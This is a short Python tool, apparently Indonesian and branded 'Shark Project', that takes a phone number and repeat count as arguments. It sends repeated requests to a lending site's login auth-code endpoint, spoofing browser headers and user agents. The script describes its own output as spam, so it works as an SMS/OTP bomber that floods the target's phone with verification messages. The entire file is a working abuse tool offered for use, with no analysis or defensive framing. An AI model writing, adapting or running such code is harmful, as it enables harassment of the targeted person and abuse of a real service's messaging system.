try:
    import requests, json, time, os, sys
    from fake_useragent import UserAgent
except ImportError:exit(f"Sepertinya Module Belum Terinstall,Install Dengan Command 'pip install requests fake_useragent'")

r = requests
ua = UserAgent()
url = 'https://apiservice.rupiahcepatweb.com/webapi/v1/request_login_register_auth_code'
hd = {
"accept": "text/html, application/xhtml+xml, application/json, */*",
"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
"content-length": "166",
"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
"origin": "https://h5.rupiahcepatweb.com",
"referer": "https://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=200219190100215723",
"sec-fetch-dest": "empty",
"sec-fetch-mode": "cors",
"sec-fetch-site": "same-site",
"user-agent": ua.random
}

def tunggu(t):
        while t:
                wd=f'Jeda selama '+str(t)+" detik "
                print(wd,end='\r',flush=True)
                time.sleep(1)
                t -= 1

try:
    os.chdir('..')
    os.system('cat banner.txt')
    os.chdir('..')
    print("============================")
    print("=      Shark Project       =")
    print("============================")
    print("\n")
except KeyboardInterrupt:exit(f"\nOk,Terima Kasih Telah Menggunakan Tools Saya")


try:
    no = sys.argv[1]
    dit = {"mobile":no,"noise":"1583590641573155574","request_time":"158359064157312","access_token":"11111"}
    dat = json.dumps(dit)
    jml = int(sys.argv[2])
    for x in range(jml):
         a = r.post(url,headers=hd,data={"data":dat}).text
         b = json.loads(a)["code"]
         if b == 0:
                  print(f"Berhasil Spam Ke No "+no)
                  tunggu(60)
         else:
                  print(f"Gagal Spam Ke No "+no)
                  tunggu(60)
except IndexError:exit("Terjadi Kesalahan!!!")
